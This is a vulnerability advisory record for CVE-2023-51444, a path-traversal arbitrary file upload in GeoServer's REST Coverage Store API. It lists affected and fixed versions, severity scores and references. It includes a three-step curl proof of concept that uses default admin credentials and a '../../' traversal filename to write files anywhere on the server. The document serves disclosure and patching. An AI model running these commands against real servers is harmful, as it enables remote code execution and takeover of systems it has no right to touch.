advisory_id: GHSA-9v5q-2gwq-q9hq
datasource_id: github_osv_importer_v2/GHSA-9v5q-2gwq-q9hq
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json
aliases:
  - CVE-2023-51444
summary: |
  Arbitrary file upload vulnerability in GeoServer's REST Coverage Store API
  ### Summary
  An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.

  ### Details
  Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.

  ### PoC
  Step 1 (create sample coverage store):
  curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic"
  Step 2 (switch store to absolute URL):
  curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"<coverageStore><url>file:///{absolute path to data directory}/data/sf/filewrite</url></coverageStore>" "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite"
  Step 3 (upload arbitrary files):
  curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write"
  Steps 1 & 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).

  ### Impact
  This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.

  ### References
  https://osgeo-org.atlassian.net/browse/GEOS-11176
  https://github.com/geoserver/geoserver/pull/7222
impacted_packages:
  - purl: pkg:maven/org.geoserver/gs-platform
    affected_versions: vers:maven/<2.23.4
    fixed_versions: vers:maven/2.23.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.geoserver/gs-restconfig
    affected_versions: vers:maven/<2.23.4
    fixed_versions: vers:maven/2.23.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.geoserver/gs-platform
    affected_versions: vers:maven/2.24.0
    fixed_versions: vers:maven/2.24.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.geoserver/gs-restconfig
    affected_versions: vers:maven/2.24.0
    fixed_versions: vers:maven/2.24.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-20
  - CWE-434
references:
  - url: https://github.com/geoserver/geoserver
    reference_type:
    reference_id:
  - url: https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8
    reference_type:
    reference_id:
  - url: https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae
    reference_type:
    reference_id:
  - url: https://github.com/geoserver/geoserver/pull/7222
    reference_type:
    reference_id:
  - url: https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq
    reference_type:
    reference_id:
  - url: https://osgeo-org.atlassian.net/browse/GEOS-11176
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-51444
    reference_type:
    reference_id: CVE-2023-51444
